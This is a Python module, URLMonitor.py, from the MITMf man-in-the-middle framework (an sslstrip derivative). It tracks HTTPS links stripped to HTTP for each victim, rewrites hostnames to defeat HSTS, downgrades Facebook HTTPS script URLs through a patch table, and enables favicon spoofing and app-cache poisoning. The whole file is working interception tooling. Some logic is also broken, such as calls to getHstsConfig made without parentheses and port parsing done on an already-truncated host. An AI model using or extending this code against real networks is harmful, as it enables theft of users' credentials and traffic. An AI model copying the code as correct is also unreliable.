# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import re, os
import logging
from core.ConfigWatcher import ConfigWatcher

mitmf_logger = logging.getLogger('mimtf')

class URLMonitor:    

    '''
    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
    server is expecting over SSL.  It also keeps track of secure favicon urls.
    '''

    # Start the arms race, and end up here...
    javascriptTrickery = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
    _instance          = None
    patchDict          = {
                          'https:\/\/fbstatic-a.akamaihd.net':'http:\/\/webfbstatic-a.akamaihd.net',
                          'https:\/\/www.facebook.com':'http:\/\/social.facebook.com',
                          'return"https:"':'return"http:"'
                         }

    def __init__(self):
        self.strippedURLs       = set()
        self.strippedURLPorts   = {}
        self.redirects          = []
        self.faviconReplacement = False
        self.hsts               = False
        self.app                = False

    @staticmethod
    def getInstance():
        if URLMonitor._instance == None:
            URLMonitor._instance = URLMonitor()

        return URLMonitor._instance
    
    #This is here because I'm lazy
    def getResolver(self):
        return ConfigWatcher.getInstance().getConfig()['MITMf']['DNS']['resolver'].lower()
    
    #This is here because I'm lazy
    def getResolverPort(self):
        return int(ConfigWatcher.getInstance().getConfig()['MITMf']['DNS']['port'])

    def isSecureLink(self, client, url):
        for expression in URLMonitor.javascriptTrickery:
            if (re.match(expression, url)):
                return True

        return (client,url) in self.strippedURLs

    def getSecurePort(self, client, url):
        if (client,url) in self.strippedURLs:
            return self.strippedURLPorts[(client,url)]
        else:
            return 443

    def addRedirection(self, from_url, to_url):
        for s in self.redirects:
            if from_url in s:
                s.add(to_url)
                return
        url_set = set([from_url, to_url])
        mitmf_logger.debug("[URLMonitor][AppCachePoison] Set redirection: {}".format(url_set))
        self.redirects.append(url_set)

    def getRedirectionSet(self, url):
        for s in self.redirects:
            if url in s:
                return s
        return set([url])

    def addSecureLink(self, client, url):
        methodIndex = url.find("//") + 2
        method      = url[0:methodIndex]

        pathIndex   = url.find("/", methodIndex)
        if pathIndex is -1:
            pathIndex = len(url)
            url += "/"

        host        = url[methodIndex:pathIndex].lower()
        path        = url[pathIndex:]

        port        = 443
        portIndex   = host.find(":")

        if (portIndex != -1):
            host = host[0:portIndex]
            port = host[portIndex+1:]
            if len(port) == 0:
                port = 443

        if self.hsts:
            if not self.getHstsConfig[1].has_key(host):
                lhost = host[:4]
                if lhost=="www.":
                    self.getHstsConfig[1][host] = "w"+host
                    self.getHstsConfig[0]["w"+host] = host
                else:
                    self.getHstsConfig[1][host] = "web"+host
                    self.getHstsConfig[0]["web"+host] = host
                mitmf_logger.debug("[URLMonitor][HSTS] SSL host ({}) tokenized ({})".format(host, self.getHstsConfig[1][host]))
                    
            url = 'http://' + host + path
            #mitmf_logger.debug("HSTS stripped URL: %s %s"%(client, url))

            self.strippedURLs.add((client, url))
            self.strippedURLPorts[(client, url)] = int(port)
            
            return 'http://'+ self.getHstsConfig[1][host] + path

        else:
            url = method + host + path

            self.strippedURLs.add((client, url))
            self.strippedURLPorts[(client, url)] = int(port)

    def setFaviconSpoofing(self, faviconSpoofing):
        self.faviconSpoofing = faviconSpoofing

    def getHstsConfig(self):
        sustitucion = dict()
        real = dict()

        for k,v in ConfigWatcher.getInstance().getConfig()['SSLstrip+']:
            sustitucion[k] = v
            real[v] = k

        return (real, sustitucion)

    def setHstsBypass(self):
        self.hsts = True

    def setAppCachePoisoning(self):
        self.app = True

    def isFaviconSpoofing(self):
        return self.faviconSpoofing

    def isSecureFavicon(self, client, url):
        return ((self.faviconSpoofing == True) and (url.find("favicon-x-favicon-x.ico") != -1))
    
    def URLgetRealHost(self, host):
        mitmf_logger.debug("[URLMonitor][HSTS] Parsing host: {}".format(host))
        
        if self.getHstsConfig()[0].has_key(host):
            mitmf_logger.debug("[URLMonitor][HSTS] Found host in list: {}".format(self.getHstsConfig()[0][host]))
            return self.getHstsConfig()[0][host]

        else:
            mitmf_logger.debug("[URLMonitor][HSTS] Host not in list: {}".format(host))
            return host
